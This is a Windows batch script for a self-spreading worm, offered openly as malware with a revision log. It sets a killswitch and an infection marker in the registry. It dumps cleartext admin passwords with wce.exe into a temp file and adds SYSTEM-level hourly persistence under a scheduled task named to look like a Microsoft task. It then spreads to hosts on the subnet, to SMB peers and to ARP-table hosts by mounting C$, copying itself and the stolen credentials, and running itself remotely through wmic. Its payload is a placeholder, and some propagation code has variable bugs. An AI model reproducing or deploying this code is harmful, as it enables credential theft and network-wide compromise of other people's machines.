:: --CHANGE LOG--
:: r3.0 - Restructure script again
:: r2.0 - Restructured entire script
:: r1.2 - Restructured :check_system
:: r1.1 - Killswitch
:: r1.0 - Runnable condition.

@echo on
::setlocal enabledelayedexpansion

:global_var
	set ldir=C:\Windows\Temp
	:: get IP config
	for /f "tokens=1-20 delims=. " %%a in ('"ipconfig | findstr /c:"Gateway""') do (
		set gw=%%d.%%e.%%f.%%g
	)
	for /f "tokens=1-20 delims=. " %%a in ('"ipconfig | findstr /c:"IPv4""') do (
		set oc1=%%d
		set oc2=%%e
		set oc3=%%f
		set oc4=%%g
	)
	call :init
	goto :EOF


:init
	:: Checks for infection marker machine is already infected.
	:: If marker is not found, adds persistence and infection marker. If it is found, continues with propagation.
	call :check_ks
	if %errorlevel% equ 0 (
		exit /b 0
	)
	call :check_marker
	if %errorlevel% equ 1 (
		call :seq1
	)
	if %errorlevel% equ 0 (
		call :seq2	
	)	
	exit /b 0


REM :check_persistence
	REM schtasks /query /tn "\Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance"
	REM if %errorlevel% equ 0 (
		REM call :seq3
	REM )
	REM if %errorlevel% equ 1 (
		REM call :seq1
	REM )
	REM exit /b 0

:check_ks
	reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v killswitch
	if %errorlevel% equ 0 (
		exit
	) ELSE (
		goto :run
	)
	exit /b 0


:seq1
	::patient zero sequence
	call :getcreds_setstaticip
	call :getcreds_pwdump
	if %errorlevel% equ 0 (
		call :add_marker
		call :add_persistence
		call :execute_action
		call :prop_seq
	)
	exit /b 0


:seq2
	::subsequent patient sequence
	call :add_marker
	call :add_persistence
	call :execute_action
	call :prop_seq
	exit /b 0


REM :seq3
	REM ::prop persistence sequence
	REM call :execute_action
	REM call :prop_seq
	REM exit /b 0


:check_marker	
	reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v isInstalled
	if %errorlevel% equ 1 (
		exit /b 1
	)
	exit /b 0

	
:getcreds_setstaticip
	:: Set random time before setting static IP as a social engineering tactic.
	set /a rval=(%RANDOM%*60/32768)+1
	timeout /t %rval% /nobreak > nul
	netsh interface ip set address "Local Area Connection" static 169.254.0.1 255.255.255.0
	exit /b 0


:getcreds_pwdump
	:: Dumps cleartext passwords every 10 seconds and dumps password to text file if admin password is detected.
	timeout /t 10 /nobreak > nul
	for /f "tokens=1-3 delims=\:" %%a in ('"%~dp0wce.exe -w | findstr /i "admin""') do (
		echo %%b\%%a %%c > "%ldir%\dapw"
	)
	if NOT EXIST "%ldir%\dapw" (
		goto :getcreds_pwdump
	)
	if EXIST "%ldir%\dapw" (
		call :getcreds_ping
		exit /b 0
	)


:getcreds_ping
	:: wait for x seconds
	ping %gw% /n 2 /w 1000 |findstr Reply | findstr -v unreachable
	if %errorlevel% neq 0 (
		goto :getcreds_ping
	)
	if %errorlevel% equ 0 (
		exit /b 0
	)


:add_marker
	:: Infection marker
	reg add HKLM\SOFTWARE\Microsoft /f /v isInstalled /t REG_SZ /d 1
	exit /b 0


:add_persistence
	:: Add task schedule persistence
	copy /y %~dp0main.bat %ldir%\main.bat
	schtasks /Create /SC HOURLY /RU SYSTEM /TN "Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance" /TR "%ldir%\main.bat" /F
	::schtasks /Create /SC HOURLY /RU SYSTEM /TN "Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance" /TR "ping 8.8.8.8" /F
	exit /b 0


:execute_action
	:: Malicious actions go here.
	echo %COMPUTERNAME% has been pwned. > C:\pwned.txt
	exit /b 0


:prop_seq
	call :prop_subnet
	call :prop_netstat
	call :prop_arp
	exit /b 0


:prop_subnet
	:: Method 1 - Find and propagate to targets on same subnet
	setlocal enabledelayedexpansion
	for /l %%q in (0,1,255) do (
		ping %oc1%.%oc2%.%oc3%.%%q /n 2 /w 500 |findstr Reply | findstr -v unreachable
		if !errorlevel! equ 0 (
			for /f "tokens=1-2 delims= " %%x in (%ldir%\dapw) do (
				net use \\%oc1%.%oc2%.%oc3%.%%q\c$ /user:%%y %%z /persistent: yes
				copy /y "%ldir%\main.bat" "\\%oc1%.%oc2%.%oc3%.%%q\c$\Windows\Temp\main.bat"
				copy /y "%ldir%\dapw" "\\%oc1%.%oc2%.%oc3%.%%q\c$\Windows\Temp\dapw"
				net use /del \\%oc1%.%oc2%.%oc3%.%%q\c$
				wmic /node:%oc1%.%oc2%.%oc3%.%%q /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
			)
		) else (
			exit /b 1
		)
	)
	endlocal
	exit /b 0


:prop_netstat
	:: Method 2 - Find and connect to targets via netstat
	setlocal enabledelayedexpansion
	for /f "delims=" %a in ('"netstat -anp tcp |findstr ":445" | findstr -v 127.0.0.1 | findstr -v 0.0.0.0 | findstr -v Address"') do (
		for /f "tokens=4 delims=: " %b in ("%a") do (
			set %netIp%=%%b
			ping %netIp% /n 2 /w 500 |findstr Reply | findstr -v unreachable
			if !errorlevel! equ 0 (
				for /f "tokens=1-2 delims= " %%x in (%ldir%\dapw) do (
					net use \\%netIp%\c$ /user:%%y %%z /persistent: yes
					copy /y "%ldir%\main.bat" "\\%netIp%\c$\Windows\Temp\main.bat"
					copy /y "%ldir%\dapw" "\\%netIp%\c$\Windows\Temp\dapw"
					net use /del \\%netIp%\c$
					wmic /node:%netIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
				)
			) else (
				exit /b 1
			)
		)
	)
	endlocal
	exit /b 0


:prop_arp
	:: Method 3 - Find and propagate to targets on ARP tables.
	setlocal enabledelayedexpansion
	for /f "delims=" %%a in ('"arp -a | findstr "dynamic" | findstr -v "Address""') do (
		for /f "tokens=1-4 delims= " %%b in ("%%a") do (
			set %arpIp%=%%b
			ping %arpIp% /n /w 500 | findstr Reply | findstr -v unreachable
			if !errorlevel! equ 0 (
				net use \\%arpIp%\c$ /user:%%y %%z /persistent: yes
				copy /y "%ldir%\main.bat" "\\%arpIp%\c$\Windows\Temp\main.bat"
				copy /y "%ldir%\dapw" "\\%arpIp%\c$\Windows\Temp\dapw"
				net use /del \\%arpIp%\c$
				wmic /node:%arpIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
			) else (
				exit /b 1
			)
		)
	)
	endlocal
	exit /b 0
